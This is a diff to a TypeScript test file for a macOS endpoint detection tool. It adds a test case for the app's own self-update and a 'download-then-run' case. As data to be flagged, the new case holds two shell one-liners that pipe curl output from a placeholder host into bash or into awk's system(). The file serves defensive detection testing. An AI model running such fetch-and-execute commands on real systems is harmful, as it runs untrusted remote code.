@@ -397,6 +397,15 @@ const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: Detectio
         }),
       ),
       exec(devTool),
+      // Vigil after it installed its own update: ad hoc signed, never flagged
+      // as a download (self-update.ts unpacks with ditto --noqtn).
+      exec(
+        proc({
+          path: '/Applications/Vigil at Home.app/Contents/MacOS/Vigil at Home',
+          signing: 'adhoc',
+          signingId: 'app.vigilathome.desktop',
+        }),
+      ),
     ],
   },
   'quarantine-removed': {
@@ -719,6 +728,17 @@ const cases: Record<string, { bad: Array<[DetectionEvent, Want]>; good: Detectio
           quarantine: { originUrl: 'https://rectangleapp.com/Rectangle.dmg' },
         }),
       }),
+    ],
+  },
+  'download-then-run': {
+    bad: [
+      [exec(shell('bash < <(curl -s https://x.test/a)')), { mode: 'shadow' }],
+      [exec(shell("curl -s https://x.test/a | awk '{system($0)}'", 'zsh')), { mode: 'shadow' }],
+    ],
+    good: [
+      exec(shell('curl -fsSL https://example.test/data.json -o data.json')),
+      exec(shell('curl -s https://example.test/data.json | jq .')),
+      ...REAL_LOCAL_READS.map((c) => exec(agentShell(c))),
     ],
   },
   'unsigned-first-network': {
